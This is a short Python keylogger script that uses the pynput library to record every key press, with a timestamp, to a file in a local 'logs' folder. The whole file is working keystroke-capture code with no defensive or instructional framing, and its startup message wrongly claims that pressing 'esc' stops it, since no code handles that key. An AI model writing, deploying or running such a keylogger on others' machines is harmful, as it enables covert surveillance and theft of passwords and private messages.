from pynput.keyboard import Listener
import logging
import os
import time

# Directory where you want to store the log file
log_directory = os.path.join(os.getcwd(), "logs")

# Ensure the directory exists
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Log file name with a timestamp
log_file = os.path.join(
    log_directory, f"keylog_{time.strftime('%Y%m%d_%H%M%S')}.txt")

# Setting up logging
logging.basicConfig(filename=log_file, level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')


def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")


def main():
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    print("Starting the keylogger. Press 'esc' to stop.")
    main()
